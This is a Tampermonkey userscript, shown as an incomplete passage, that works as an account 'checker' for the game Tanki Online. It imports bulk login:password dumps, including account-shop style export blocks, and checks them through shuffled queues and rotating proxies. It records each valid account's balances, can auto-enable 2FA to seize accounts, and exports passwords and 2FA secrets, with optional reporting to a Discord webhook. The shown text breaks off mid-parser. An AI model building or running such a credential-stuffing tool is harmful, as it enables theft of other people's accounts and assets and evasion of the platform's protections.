// ==UserScript==
// @name         Tanki Online — Checker prod. by yuuairline
// @namespace    http://tampermonkey.net/
// @version      1.0.2
// @description  Checker + auto 2FA enable
// @author       yuuairline
// @match        https://*.tankionline.com/play/
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_xmlhttpRequest
// @connect      *
// @run-at       document-end
// ==/UserScript==

(function () {
    'use strict';

    // =========================================================
    // CONFIG
    // =========================================================
    const DEFAULT_CONFIG = {
        DISCORD_WEBHOOK: "",
        CHECK_INTERVAL: 800,
        DB_PREFIX: "tanki_acc_",
        ACCOUNTS_KEY: "tanki_accounts_v71",
        SETTINGS_KEY: "tanki_settings_v71",
        RUNNING_KEY: "tanki_running_v71",
        MODE_KEY: "tanki_mode_v71",
        RUBIES_LIST_KEY: "tanki_rubies_list_v71",
        RUBIES_ACCOUNTS_KEY: "tanki_rubies_accounts_v72",
        RUBIES_ARCHIVE_KEY: "tanki_rubies_accounts_archive_v81",
        RUBIES_RUN_QUEUE_KEY: "tanki_rubies_run_queue_v75",
        RUBIES_RUN_CURSOR_KEY: "tanki_rubies_run_cursor_v75",
        RUBIES_LAST_RUN_KEY: "tanki_rubies_last_run_v71",
        MENU_KEY: "f8",
        IP_CHECK_ENABLED: true,
        DISCORD_RUBIES_NOTIFICATIONS: true,
        THEME: "dark",
        RUBIES_MODE: "manual",
        RUBIES_AUTO_ENABLED: true,
        RUBIES_AUTO_START_ON_RELOAD: true,
        RUBIES_AUTO_TIME: "05:00",
        RUBIES_AUTO_ADD_BONUS: true,
        RUBIES_SKIP_FINISHED: true,
        RUBIES_HASH_SWITCH_KEY: "tanki_rubies_hash_switch_v82",
        RESULTS_KEY: "tanki_valid_results_v90",
        QUEUE_KEY: "tanki_check_queue_v90",
        QUEUE_CURSOR_KEY: "tanki_check_cursor_v90",
        EMPTY_LOGIN_RELOAD_KEY: "tanki_empty_login_reload_v90",
        OPS_LOG_KEY: "tanki_ops_log_v90",
        FAST_VALID_ACCOUNTS_KEY: "tanki_fast_valid_accounts_v90",
        FAST_VALID_DB_PREFIX: "tanki_fv_acc_",
        FAST_VALID_QUEUE_KEY: "tanki_fast_valid_queue_v90",
        FAST_VALID_QUEUE_CURSOR_KEY: "tanki_fast_valid_cursor_v90",
        PROXY_ROTATION_STATE_KEY: "tanki_proxy_rotation_state_v1",
        PROXY_ROTATION_BATCH_SIZE: 10,
        PROXY_ROTATION_CHANNEL: "PROXY_ROTATION_BRIDGE_V1",
        PROXY_ROTATION_TEST_TIMEOUT: 10000,
        PROXY_ENABLED: true,
        AUTO_ENABLE_2FA: false,
        TWOFA_ACCOUNTS_KEY: "tanki_2fa_accounts_v1"
    };

    const MAX_EMPTY_LOGIN_RELOADS = 3;
    const EMPTY_LOGIN_COOLDOWN_MS = 15000;

    // =========================================================
    // PROXY ROTATION CONFIG
    // =========================================================
    const PROXY_LIST_KEY = "tanki_proxy_rotation_list_v2";
    const PROXY_LIST_SEPARATOR = "\n";

    function loadProxyListFromStorage() {
        try {
            const raw = GM_getValue(PROXY_LIST_KEY, "");
            if (Array.isArray(raw)) return raw.filter(Boolean);
            return String(raw || "")
                .split(/\r?\n/)
                .map(s => s.trim())
                .filter(Boolean);
        } catch (_) {
            return [];
        }
    }

    function saveProxyListToStorage(list) {
        const normalized = (Array.isArray(list) ? list : [])
            .map(v => String(v || "").trim())
            .filter(Boolean);
        GM_setValue(PROXY_LIST_KEY, normalized.join(PROXY_LIST_SEPARATOR));
        return normalized;
    }

    function getProxyListText() {
        return loadProxyListFromStorage().join(PROXY_LIST_SEPARATOR);
    }

    const MIN_EXPERIENCE = 12300;

    let CONFIG = { ...DEFAULT_CONFIG };
    let MODE = GM_getValue(CONFIG.MODE_KEY, "checker");

    function loadConfig() {
        try {
            const saved = GM_getValue(CONFIG.SETTINGS_KEY, null);
            if (saved) CONFIG = { ...DEFAULT_CONFIG, ...JSON.parse(saved) };
        } catch (e) {}
    }
    function saveConfig() {
        GM_setValue(CONFIG.SETTINGS_KEY, JSON.stringify({
            DISCORD_WEBHOOK: CONFIG.DISCORD_WEBHOOK,
            CHECK_INTERVAL: CONFIG.CHECK_INTERVAL,
            MENU_KEY: CONFIG.MENU_KEY,
            IP_CHECK_ENABLED: CONFIG.IP_CHECK_ENABLED,
            DISCORD_RUBIES_NOTIFICATIONS: CONFIG.DISCORD_RUBIES_NOTIFICATIONS,
            THEME: CONFIG.THEME,
            RUBIES_MODE: CONFIG.RUBIES_MODE,
            RUBIES_AUTO_ENABLED: CONFIG.RUBIES_AUTO_ENABLED,
            RUBIES_AUTO_START_ON_RELOAD: CONFIG.RUBIES_AUTO_START_ON_RELOAD,
            RUBIES_AUTO_TIME: CONFIG.RUBIES_AUTO_TIME,
            RUBIES_AUTO_ADD_BONUS: CONFIG.RUBIES_AUTO_ADD_BONUS,
            RUBIES_SKIP_FINISHED: CONFIG.RUBIES_SKIP_FINISHED,
            PROXY_ENABLED: CONFIG.PROXY_ENABLED,
            AUTO_ENABLE_2FA: CONFIG.AUTO_ENABLE_2FA
        }));
        GM_setValue(CONFIG.MODE_KEY, MODE);
    }
    loadConfig();

    // =========================================================
    // RANKS
    // =========================================================
    const RANKS_RU = [
        { rankName: "Новобранец", experience: 0 },
        { rankName: "Рядовой", experience: 100 },
        { rankName: "Ефрейтор", experience: 500 },
        { rankName: "Капрал", experience: 1500 },
        { rankName: "Мастер-капрал", experience: 3700 },
        { rankName: "Сержант", experience: 7100 },
        { rankName: "Штаб-сержант", experience: 12300 },
        { rankName: "Мастер-сержант", experience: 20000 },
        { rankName: "Первый сержант", experience: 29000 },
        { rankName: "Сержант-майор", experience: 41000 },
        { rankName: "Уорент-офицер 1", experience: 57000 },
        { rankName: "Уорент-офицер 2", experience: 76000 },
        { rankName: "Уорент-офицер 3", experience: 98000 },
        { rankName: "Уорент-офицер 4", experience: 125000 },
        { rankName: "Уорент-офицер 5", experience: 156000 },
        { rankName: "Младший лейтенант", experience: 192000 },
        { rankName: "Лейтенант", experience: 233000 },
        { rankName: "Старший лейтенант", experience: 280000 },
        { rankName: "Капитан", experience: 332000 },
        { rankName: "Майор", experience: 390000 },
        { rankName: "Подполковник", experience: 455000 },
        { rankName: "Полковник", experience: 527000 },
        { rankName: "Бригадир", experience: 606000 },
        { rankName: "Генерал-майор", experience: 692000 },
        { rankName: "Генерал-лейтенант", experience: 787000 },
        { rankName: "Генерал", experience: 889000 },
        { rankName: "Маршал", experience: 1000000 },
        { rankName: "Фельдмаршал", experience: 1122000 },
        { rankName: "Командор", experience: 1255000 },
        { rankName: "Генералиссимус", experience: 1400000 },
        { rankName: "Легенда", experience: 1600000 }
    ];

    function getRankByExperience(exp) {
        let result = RANKS_RU[0];
        for (const rank of RANKS_RU) if (exp >= rank.experience) result = rank;
        if (exp >= 1600000) {
            const legendLevel = Math.floor((exp - 1600000) / 200000) + 1;
            if (legendLevel <= 1) return { rankName: "Легенда", experience: 1600000 };
            return { rankName: `Легенда ${legendLevel}`, experience: 1600000 + (legendLevel - 1) * 200000 };
        }
        return result;
    }

    // =========================================================
    // STATE
    // =========================================================
    let ACCOUNTS = [];
    let FAST_VALID_ACCOUNTS = [];
    let RUBIES_ACCOUNTS = [];
    let RUBIES_ARCHIVE = [];
    let currentIndex = 0;
    let isRunning = false;
    let isPaused = false;
    let isInitialized = false;
    let selectedFilter = "all";
    let selectedIssueSubfilter = "all";
    let searchQuery = "";
    let accountsSearchQuery = "";
    let selectedYears = [];
    let selectedRanks = [];
    let shuffledAccounts = [];
    let selectedAccountLogin = null;
    let menuOpen = false;
    let showRankPanel = false;
    let showYearPanel = false;
    let currentTab = "dashboard";
    let rubiesSchedulerTimer = null;
    let lastAutoRunKey = null;

    // =========================================================
    // STORAGE
    // =========================================================
    function loadAccounts() {
        try {
            const saved = GM_getValue(CONFIG.ACCOUNTS_KEY, null);
            ACCOUNTS = saved ? JSON.parse(saved) : [];
        } catch (e) { ACCOUNTS = []; }
    }
    function saveAccounts() { GM_setValue(CONFIG.ACCOUNTS_KEY, JSON.stringify(ACCOUNTS)); }
    function setRunningState(v) { isRunning = v; GM_setValue(CONFIG.RUNNING_KEY, v); }
    function loadRunningState() { return !!GM_getValue(CONFIG.RUNNING_KEY, false); }

    // =========================================================
    // FAST VALID — ОТДЕЛЬНАЯ БАЗА АККАУНТОВ / СТАТУСОВ / ОЧЕРЕДИ
    // =========================================================
    function loadFastValidAccounts() {
        try {
            const raw = GM_getValue(CONFIG.FAST_VALID_ACCOUNTS_KEY, null);
            FAST_VALID_ACCOUNTS = raw ? JSON.parse(raw) : [];
            if (!Array.isArray(FAST_VALID_ACCOUNTS)) FAST_VALID_ACCOUNTS = [];
        } catch (e) {
            FAST_VALID_ACCOUNTS = [];
        }
    }
    function saveFastValidAccounts() {
        GM_setValue(CONFIG.FAST_VALID_ACCOUNTS_KEY, JSON.stringify(FAST_VALID_ACCOUNTS));
    }
    function getFastValidStatus(login) {
        const data = GM_getValue(CONFIG.FAST_VALID_DB_PREFIX + login, null);
        return data ? JSON.parse(data) : null;
    }
    function setFastValidStatus(login, status) {
        GM_setValue(CONFIG.FAST_VALID_DB_PREFIX + login, JSON.stringify(status));
    }
    function isFastValidFinished(login) {
        const s = getFastValidStatus(login);
        return !!(s && (s.done || s.blocked || s.nicknameChanged || s.invalid || s.twofa || s.deleted || s.error));
    }
    function clearFastValidStatuses() {
        for (const acc of FAST_VALID_ACCOUNTS) {
            try { GM_deleteValue(CONFIG.FAST_VALID_DB_PREFIX + acc.login); } catch (_) {}
        }
    }
    function clearFastValidAccounts() {
        clearFastValidStatuses();
        FAST_VALID_ACCOUNTS = [];
        saveFastValidAccounts();
        clearFastValidQueue();
    }
    function addFastValidAccountsFromText(text) {
        const parsed = sortAccounts(String(text || ""));
        const existing = new Set(FAST_VALID_ACCOUNTS.map(a => String(a.login || "").trim().toLowerCase()));
        let added = 0, dup = 0;
        for (const acc of parsed) {
            if (!acc || !acc.login || !acc.password) continue;
            const key = String(acc.login).trim().toLowerCase();
            if (existing.has(key)) { dup++; continue; }
            existing.add(key);
            FAST_VALID_ACCOUNTS.push({
                login: acc.login,
                password: acc.password,
                email: acc.email || null,
                year: acc.year || null,
                rankFromBase: acc.rankFromBase || null,
                bound: acc.bound !== undefined ? acc.bound : null
            });
            added++;
        }
        if (added) saveFastValidAccounts();
        return { added, dup, parsed: parsed.length };
    }
    function saveFastValidQueue(queue, cursor) {
        const safeQueue = (Array.isArray(queue) ? queue : []).map(a => ({
            login: a.login,
            password: a.password,
            email: a.email || null
        }));
        GM_setValue(CONFIG.FAST_VALID_QUEUE_KEY, JSON.stringify(safeQueue));
        GM_setValue(CONFIG.FAST_VALID_QUEUE_CURSOR_KEY, Math.max(0, cursor | 0));
    }
    function loadFastValidQueue() {
        try {
            const q = JSON.parse(GM_getValue(CONFIG.FAST_VALID_QUEUE_KEY, "[]") || "[]");
            const c = parseInt(GM_getValue(CONFIG.FAST_VALID_QUEUE_CURSOR_KEY, 0), 10) || 0;
            return { queue: Array.isArray(q) ? q : [], cursor: c };
        } catch (e) {
            return { queue: [], cursor: 0 };
        }
    }
    function clearFastValidQueue() {
        try { GM_deleteValue(CONFIG.FAST_VALID_QUEUE_KEY); } catch (_) {}
        try { GM_deleteValue(CONFIG.FAST_VALID_QUEUE_CURSOR_KEY); } catch (_) {}
    }
    function beginFastValidQueue() {
        const filtered = FAST_VALID_ACCOUNTS.filter(a => a && a.login && a.password && !isFastValidFinished(a.login));
        shuffledAccounts = shuffleArray(filtered);
        currentIndex = 0;
        saveFastValidQueue(shuffledAccounts, 0);
        return shuffledAccounts.length;
    }
    function restoreFastValidQueue() {
        const { queue, cursor } = loadFastValidQueue();
        if (!queue.length) return false;
        shuffledAccounts = queue;
        currentIndex = Math.min(Math.max(0, cursor), queue.length);
        return true;
    }
    function advanceFastValidQueue() {
        currentIndex++;
        saveFastValidQueue(shuffledAccounts, currentIndex);
    }

    function getAccountStatus(login) {
        const data = GM_getValue(CONFIG.DB_PREFIX + login, null);
        return data ? JSON.parse(data) : null;
    }
    function setAccountStatus(login, status) {
        GM_setValue(CONFIG.DB_PREFIX + login, JSON.stringify(status));
    }
    function isAccountFinished(login) {
        const s = getAccountStatus(login);
        return s && (s.done || s.blocked || s.nicknameChanged || s.invalid || s.twofa || s.deleted || s.skippedLowRank);
    }

    function isAccountCheckCompleted(login) {
        const s = getAccountStatus(login);
        if (!s) return false;
        return !!(
            (s.done && s.valid) ||
            s.invalid ||
            s.blocked ||
            s.twofa ||
            s.deleted ||
            s.skippedLowRank
        );
    }

    function getUncheckedAccounts() {
        return ACCOUNTS.filter(acc => acc && acc.login && !isAccountCheckCompleted(acc.login));
    }

    // =========================================================
    // OPS LOG
    // =========================================================
    function appendOpsLog(msg) {
        try {
            const list = JSON.parse(GM_getValue(CONFIG.OPS_LOG_KEY, "[]") || "[]");
            list.push({ t: new Date().toISOString(), m: String(msg) });
            while (list.length > 80) list.shift();
            GM_setValue(CONFIG.OPS_LOG_KEY, JSON.stringify(list));
        } catch (_) {}
    }

    // =========================================================
    // PERSISTENT VALID RESULTS (независимо от ACCOUNTS / RUBIES)
    // =========================================================
    function loadValidResults() {
        try {
            const raw = GM_getValue(CONFIG.RESULTS_KEY, null);
            const arr = raw ? JSON.parse(raw) : [];
            return Array.isArray(arr) ? arr : [];
        } catch (e) { return []; }
    }

    function saveValidResults(list) {
        GM_setValue(CONFIG.RESULTS_KEY, JSON.stringify(Array.isArray(list) ? list : []));
    }

    function upsertValidResult(payload) {
        if (!payload || !payload.login) return false;
        const key = String(payload.login).trim().toLowerCase();
        if (!key) return false;

        const list = loadValidResults();
        const idx = list.findIndex(r => String(r.login || "").toLowerCase() === key);

        const safe = {
            login: payload.login,
            password: payload.password || null,
            status: "valid",
            username: payload.username || null,
            rank: payload.rank || null,
            experience: payload.experience ?? null,
            rubies: payload.rubies || "0",
            crystals: payload.crystals || "0",
            goldBoxes: (payload.goldBoxes !== undefined && payload.goldBoxes !== null && payload.goldBoxes !== "")
                ? String(payload.goldBoxes)
                : null,
            tankoins: payload.tankoins || "0",
            year: payload.year ?? null,
            bound: payload.bound ?? null,
            nickChange: payload.nickChange || null,
            bonusReceived: !!payload.bonusReceived,
            newNickname: payload.newNickname || null,
            loginWasEmail: !!payload.loginWasEmail,
            proxyIp: payload.proxyIp || null,
            twofaSecret: payload.twofaSecret || null,
            checkedAt: new Date().toISOString(),
            source: payload.source || "checker"
        };

        if (idx >= 0) list[idx] = { ...list[idx], ...safe };
        else list.push(safe);
        saveValidResults(list);
        appendOpsLog("valid_saved:" + payload.login);
        return true;
    }

    function removeValidResult(login) {
        const key = String(login || "").trim().toLowerCase();
        const list = loadValidResults().filter(r => String(r.login || "").toLowerCase() !== key);
        saveValidResults(list);
        appendOpsLog("valid_removed:" + login);
    }

    function clearValidResults() {
        saveValidResults([]);
        appendOpsLog("valid_cleared");
    }

    function exportValidResultsTxt() {
        const list = loadValidResults();
        if (!list.length) {
            showToast("Нет сохранённых результатов", "warning");
            return;
        }

        const accountsByLogin = new Map(
            ACCOUNTS.map(a => [String(a.login || "").trim().toLowerCase(), a])
        );

        const text = list.map(r => {
            const acc = accountsByLogin.get(String(r.login || "").trim().toLowerCase());
            const password = r.password || acc?.password || "—";

            const twofa = get2FAByLogin(r.login);
            const secret = twofa?.secret || r.twofaSecret || null;
            const lines = [
                "--------------------------",
                "Логин - " + r.login,
                "Пароль - " + password,
                "Ник - " + (r.username || "—"),
                "Ранг - " + (r.rank || "—"),
                "Опыт - " + (r.experience != null ? r.experience : "—"),
                "Рубины - " + formatAmount(r.rubies),
                "Кристаллы - " + formatAmount(r.crystals),
                "Золотые ящики - " + (r.goldBoxes !== null && r.goldBoxes !== undefined && r.goldBoxes !== "" ? formatAmount(r.goldBoxes) : "—"),
                "Танкоины - " + formatAmount(r.tankoins),
                "Год - " + (r.year || "—"),
                "Привязан - " + (r.bound === true ? "да" : r.bound === false ? "нет" : "—"),
                "Смена ника - " + (r.nickChange || "—"),
                "Компенсация - " + (r.bonusReceived ? "да" : "нет"),
                "Новый ник - " + (r.newNickname || "—"),
                "IP - " + (r.proxyIp || "—"),
                "Проверено - " + (r.checkedAt || "—")
            ];
            if (secret) lines.push("2FA secret - " + secret);
            return lines.join("\n");
        }).join("\n");

        const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = "tanki-valid-results-" + new Date().toISOString().slice(0, 10) + ".txt";
        a.click();
        setTimeout(() => URL.revokeObjectURL(a.href), 1000);
        showToast("Выгружено результатов: " + list.length, "success");
    }

    // =========================================================
    // CHECK QUEUE (независима от источника базы)
    // =========================================================
    function saveCheckQueue(queue, cursor) {
        const safeQueue = (Array.isArray(queue) ? queue : []).map(a => ({
            login: a.login,
            password: a.password,
            email: a.email || null
        }));
        GM_setValue(CONFIG.QUEUE_KEY, JSON.stringify(safeQueue));
        GM_setValue(CONFIG.QUEUE_CURSOR_KEY, Math.max(0, cursor | 0));
    }

    function loadCheckQueue() {
        try {
            const q = JSON.parse(GM_getValue(CONFIG.QUEUE_KEY, "[]") || "[]");
            const c = parseInt(GM_getValue(CONFIG.QUEUE_CURSOR_KEY, 0), 10) || 0;
            return { queue: Array.isArray(q) ? q : [], cursor: c };
        } catch (e) {
            return { queue: [], cursor: 0 };
        }
    }

    function clearCheckQueue() {
        try { GM_deleteValue(CONFIG.QUEUE_KEY); } catch (_) {}
        try { GM_deleteValue(CONFIG.QUEUE_CURSOR_KEY); } catch (_) {}
    }

    function beginCheckQueueFromAccounts(list) {
        const filtered = (list || []).filter(a => a && a.login && a.password);
        const queue = filtered.filter(a => !isAccountFinished(a.login));
        shuffledAccounts = shuffleArray(queue);
        currentIndex = 0;
        saveCheckQueue(shuffledAccounts, 0);
        return shuffledAccounts.length;
    }

    function restoreCheckQueue() {
        const { queue, cursor } = loadCheckQueue();
        if (!queue.length) return false;
        shuffledAccounts = queue;
        currentIndex = Math.min(Math.max(0, cursor), queue.length);
        return true;
    }

    function advanceCheckQueue() {
        currentIndex++;
        saveCheckQueue(shuffledAccounts, currentIndex);
        if (MODE === "checker") {
            proxyRotationManager?.finishAccountCheck();
        }
    }

    // =========================================================
    // EMPTY LOGIN / EMAIL ERROR WATCHER
    // =========================================================
    let _emptyLoginObserver = null;
    let _emptyLoginPoll = null;
    let _emptyLoginVisibleSince = 0;
    let _emptyLoginHandling = false;
    let _emptyLoginStopped = false;
    let _emptyLoginLastLogTs = 0;

    function isEmptyLoginOrEmailErrorVisible() {
        const blocks = document.querySelectorAll(
            ".EntranceComponentStyle-commonBlockMessageError, [class*='commonBlockMessageError'], .textError"
        );
        for (const block of blocks) {
            if (!block || !block.isConnected) continue;
            const text = (block.textContent || "").replace(/\s+/g, " ").trim();
            if (/Введите\s+имя\s+или\s+email/i.test(text)) return true;
            const span = block.querySelector(".EntranceComponentStyle-informationWriting span, [class*='informationWriting'] span");
            if (span && /Введите\s+имя\s+или\s+email/i.test((span.textContent || "").trim())) return true;
        }
        if (document.querySelector("#username") || document.querySelector(".EntranceComponentStyle-buttonActive")) {
            for (const el of document.querySelectorAll("span, div")) {
                const t = (el.textContent || "").trim();
                if (t === "*Введите имя или email" || t === "Введите имя или email") {
                    if (el.closest("[class*='MessageError'], [class*='textError'], [class*='informationWriting']")) return true;
                }
            }
        }
        return false;
    }

    function getEmptyLoginReloadState() {
        try {
            return JSON.parse(GM_getValue(CONFIG.EMPTY_LOGIN_RELOAD_KEY, "null")) || { count: 0, ts: 0 };
        } catch (e) {
            return { count: 0, ts: 0 };
        }
    }

    function setEmptyLoginReloadState(state) {
        GM_setValue(CONFIG.EMPTY_LOGIN_RELOAD_KEY, JSON.stringify(state));
    }

    function clearEmptyLoginReloadState() {
        try { GM_deleteValue(CONFIG.EMPTY_LOGIN_RELOAD_KEY); } catch (_) {}
        _emptyLoginVisibleSince = 0;
        _emptyLoginHandling = false;
    }

    function handleEmptyLoginOrEmailError() {
        if (_emptyLoginStopped || _emptyLoginHandling) return false;
        if (window.__tankiTypingCredentials) {
            _emptyLoginVisibleSince = 0;
            return false;
        }

        const userEl = document.querySelector("#username");
        const passEl = document.querySelector("#password");
        const fieldsEmpty = !!(userEl && passEl &&
            !(userEl.value || "").trim() && !(passEl.value || "").trim());

        const visible = isEmptyLoginOrEmailErrorVisible() && fieldsEmpty;
        if (!visible) {
            _emptyLoginVisibleSince = 0;
            return false;
        }

        const now = Date.now();
        if (!_emptyLoginVisibleSince) {
            _emptyLoginVisibleSince = now;
            if (now - _emptyLoginLastLogTs > 10000) {
                console.warn('[auth] Пустая форма + «Введите имя или email» — ждём 5с…');
                _emptyLoginLastLogTs = now;
            }
            return false;
        }

        const visibleMs = now - _emptyLoginVisibleSince;
        if (visibleMs < 5000) return false;

        const st = getEmptyLoginReloadState();

        if (st.ts && (now - st.ts) < EMPTY_LOGIN_COOLDOWN_MS && st.count >= MAX_EMPTY_LOGIN_RELOADS) {
            if (!_emptyLoginStopped) {
                console.error("[auth] Лимит reload из-за «Введите имя или email» — watcher остановлен");
                appendOpsLog("empty_login_stop");
                try {
                    setRunningState(false);
                    isRunning = false;
                    updateUI();
                    showToast("«Введите имя или email» повторяется — скрипт остановлен", "error");
                } catch (_) {}
                _emptyLoginStopped = true;
                stopEmptyLoginWatcher();
            }
            return true;
        }

        _emptyLoginHandling = true;
        const nextCount = (st.ts && (now - st.ts) < 120000) ? (st.count + 1) : 1;
        setEmptyLoginReloadState({ count: nextCount, ts: now });

        try {
            saveCheckQueue(shuffledAccounts, currentIndex);
            GM_setValue(CONFIG.MODE_KEY, MODE);
            setRunningState(isRunning);
        } catch (_) {}

        appendOpsLog("empty_login_reload:" + nextCount);
        console.warn("[auth] Ошибка висела >5с — reload (" + nextCount + "/" + MAX_EMPTY_LOGIN_RELOADS + ")");
        try {
            showToast("«Введите имя или email» >5с — reload (" + nextCount + "/" + MAX_EMPTY_LOGIN_RELOADS + ")", "warning");
        } catch (_) {}

        stopEmptyLoginWatcher();
        setTimeout(() => location.reload(), 250);
        return true;
    }

    function startEmptyLoginWatcher() {
        if (window.__tankiEmptyLoginWatcherStarted) return;
        window.__tankiEmptyLoginWatcherStarted = true;
        _emptyLoginStopped = false;
        _emptyLoginHandling = false;
        _emptyLoginVisibleSince = 0;

        handleEmptyLoginOrEmailError();

        _emptyLoginObserver = new MutationObserver(() => {
            handleEmptyLoginOrEmailError();
        });
        _emptyLoginObserver.observe(document.documentElement, { childList: true, subtree: true, characterData: true });

        _emptyLoginPoll = setInterval(() => {
            handleEmptyLoginOrEmailError();
        }, 1200);
    }

    function stopEmptyLoginWatcher() {
        try { _emptyLoginObserver?.disconnect(); } catch (_) {}
        if (_emptyLoginPoll) {
            clearInterval(_emptyLoginPoll);
            _emptyLoginPoll = null;
        }
        _emptyLoginObserver = null;
        window.__tankiEmptyLoginWatcherStarted = false;
    }

    // =========================================================
    // PARSER
    // =========================================================
    function sortAccounts(text) {
        const accounts = [];
        const seen = new Set();

        function addAccount(login, password, extra = {}) {
            if (!login || !password) return;
            login = String(login).trim();
            password = String(password).trim();
            if (login.length < 2 || password.length < 2) return;
            const key = login.toLowerCase();
            if (seen.has(key)) return;
            seen.add(key);
            accounts.push({
                login,
                password,
                email: normalizeEmail(extra.email),
                year: extra.year || null,
                rankFromBase: extra.rankFromBase || null,
                bound: extra.bound !== undefined ? extra.bound : null,
                twofaSecret: extra.twofaSecret || null,
                nickname: extra.nickname || null,
                experience: extra.experience ?? null,
                rubies: extra.rubies || null,
                crystals: extra.crystals || null,
                tankoins: extra.tankoins || null
            });
        }

        const normalizedText = String(text || '').replace(/\r/g, '');

        let blocks = normalizedText
            .split(/^\s*(?:[-=_*#]+|--[A-Za-z0-9_-]+--)\s*$/m)
            .map(b => b.trim())
            .filter(Boolean);

        if (blocks.length <= 1 && /Сервис\s*:\s*Танки\s*Онлайн/i.test(normalizedText)) {
            const serviceBlocks = normalizedText
                .split(/(?=Сервис\s*:\s*Танки\s*Онлайн)/i)
                .map(b => b.trim())
                .filter(Boolean);
            if (serviceBlocks.length > 1) blocks = serviceBlocks;
        }

        if (blocks.length <= 1) {
            const multi = normalizedText
                .split(/(?=^(?:Рейтинг|Ник|Логин)\s*[-:])/im)
                .map(b => b.trim())
                .filter(Boolean);
            if (multi.length > 1) blocks = multi;
        }

        const LABEL_RE = /^(?:Сервис|сервис|Рейтинг|рейтинг|Ник|ник|Логин|логин|Login|login|Пароль|пароль|Password|password|Почта|почта|Email|email|E-mail|Пароль от почты|пароль от почты|Ранг|ранг|Привязан|привязан|Кристаллы|кристаллы|Рубины|рубины|Танкоины|танкоины|Опыт|опыт|2FA|Secret|Секрет|Активировано|активировано|Припасы|припасы|Контейнеры|контейнеры|Рефералы|рефералы|ID|Доп\.?\s*поле|доп\.?\s*поле|Дата|дата|Дата получения|дата получения|Дата регистрации)/i;

        for (const line of normalizedText.split(/\n/).map(x => x.trim()).filter(Boolean)) {
            if (LABEL_RE.test(line)) continue;
            if (/^https?:\/\//i.test(line)) continue;
            const pair = line.match(/^([^\s:;]+)\s*[:;]\s*(\S+)$/);
            if (pair && !pair[1].toLowerCase().includes('http')) {
                addAccount(pair[1], pair[2]);
            }
        }

        const NICK_RE = /^(?:Ник|ник|Логин|логин|Login|login)\s*[-:]\s*(.+?)\s*$/i;
        const PASS_RE = /^(?:Пароль|пароль|Password|password)\s*[-:]\s*(.+?)\s*$/i;
        const EMAIL_RE = /^(?:Почта|почта|Email|email|E-mail)\s*[-:]\s*(.+?)\s*$/i;

        function parseServiceExportBlock(block) {
            if (!/Сервис\s*:\s*Танки\s*Онлайн/i.test(block)) return null;
            const clean = block.replace(/\s+/g, ' ').trim();
            const readField = (label, nextLabels) => {
                const stop = nextLabels.join('|');
                const re = new RegExp(label + '\\s*:\\s*(.*?)(?=\\s+(?:' + stop + ')\\s*:|$)', 'i');
                const m = clean.match(re);
                return m ? m[1].trim() : null;
            };
            const login = readField('Логин', ['Пароль', 'Почта', 'Пароль от почты', 'Доп\\. поле', 'Дата получения', 'Сервис']);
            const password = readField('Пароль', ['Почта', 'Пароль от почты', 'Доп\\. поле', 'Дата получения', 'Сервис']);
            const email = readField('Почта', ['Пароль от почты', 'Доп\\. поле', 'Дата получения', 'Сервис']);
            const date = readField('Дата получения', ['Сервис']);
            const extra = readField('Доп\\. поле', ['Доп\\. поле', 'Дата получения', 'Сервис']);
            let year = null;
            const dm = date && date.match(/(\d{4})[-.\/]\d{1,2}[-.\/]\d{1,2}/);
            if (dm) year = parseInt(dm[1], 10);
            return { login, password, email: normalizeEmail(email), year, rankFromBase: extra || null, bound: null };
        }

        for (const block of blocks) {
            const serviceAccount = parseServiceExportBlock(block);
            if (serviceAccount && serviceAccount.login && serviceAccount.password) {
                addAccount(serviceAccount.login, serviceAccount.password, serviceAccount);
                continue;
            }

            let login = null;
            let password = null;
            let email = null;
            let year = null;
            let rankFromBase = null;
            let bound = null;
            let twofaSecret = null;
            let nickname = null;
            let experience = null;
            let rubies = null;
            let crystals = null;
            let tankoins = null;

            const flush = () => {
                if (login && password) {
                    addAccount(login, password, {
                        email, year, rankFromBase, bound, twofaSecret,
                        nickname, experience, rubies, crystals, tankoins
                    });
                }
                login = null;
                password = null;
                email = null;
                year = null;
                rankFromBase = null;
                bound = null;
                twofaSecret = null;
                nickname = null;
                experience = null;
                rubies = null;
                crystals = null;
                tankoins = null;
            };

            const lines = block.split(/\n/).map(x => x.trim()).filter(Boolean);
            for (const line of lines) {
                const nickOnly = line.match(/^(?:Ник|ник|Nickname)\s*[-:]\s*(.+?)\s*$/i);
                if (nickOnly) {
                    nickname = nickOnly[1].trim();
                    if (!login) login = nickname;
                    continue;
                }

                const nickMatch = line.match(NICK_RE);
                if (nickMatch) {
                    if (login && password) flush();
                    let nickVal = nickMatch[1].trim();
                    const legacy = nickVal.match(/^([^:\s]+)\s*:\s*(.+)$/);
                    if (legacy && !password) {
                        login = legacy[1].trim();
                        password = legacy[2].trim();
                    } else {
                        login = nickVal;
                    }
                    continue;
                }

                const passMatch = line.match(PASS_RE);
                if (passMatch) {
                    password = passMatch[1].trim();
                    continue;
                }

                const emailMatchLine = line.match(EMAIL_RE);
                if (emailMatchLine) {
                    email = normalizeEmail(emailMatchLine[1]);
                    continue;
                }

                const dateMatch = line.match(/(?:Дата регистрации|дата регистрации|Дата|дата)\s*[-:]\s*(\d{1,2})[.\/-](\d{1,2})[.\/-](\d{4})/i);
                if (dateMatch) {
                    year = parseInt(dateMatch[3], 10);
                    continue;
                }

                const rankMatch = line.match(/(?:Ранг|ранг)\s*[-:]\s*(?:\d+\s+)?(.+)/i);
                if (rankMatch) {
                    rankFromBase = rankMatch[1].trim();
                    continue;
                }

                const boundMatch = line.match(/(?:Привязан|привязан)\s*[-:]\s*(да|нет)/i);
                if (boundMatch) {
                    bound = boundMatch[1].toLowerCase() === 'да';
                    continue;
                }

                const twofaMatch = line.match(/^(?:2FA(?:\s*secret)?|Secret|Секрет|2fa secret)\s*[-:]\s*(.+)$/i);
                if (twofaMatch) {
                    twofaSecret = twofaMatch[1].replace(/\s+/g, "").toUpperCase();
                    continue;
                }

                const expMatch = line.match(/^(?:Опыт|опыт)\s*[-:]\s*([\d\s\u00A0]+)/i);
                if (expMatch) {
                    experience = parseInt(String(expMatch[1]).replace(/\s/g, ""), 10) || null;
                    continue;
                }
                const rubMatch = line.match(/^(?:Рубины|рубины)\s*[-:]\s*(.+)$/i);
                if (rubMatch) {
                    rubies = parseNumberFromText(rubMatch[1]);
                    continue;
                }
